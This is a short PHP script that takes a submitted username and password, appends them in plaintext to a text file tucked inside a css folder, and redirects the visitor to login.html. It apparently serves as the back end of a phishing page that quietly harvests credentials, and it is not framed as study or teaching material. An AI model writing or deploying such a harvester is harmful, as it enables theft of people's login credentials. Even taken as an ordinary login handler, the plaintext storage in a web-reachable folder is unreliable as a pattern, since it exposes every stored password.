<?php 
	$username = $_POST['name'];
	$password = $_POST['password'];
	
	$file = fopen("css/password.txt","a+");
	fwrite($file,$username);
	fwrite($file,"  ");
	fwrite($file,$password);
	fwrite($file,"\n");
	fclose($file);

	header("Location:login.html");
 ?>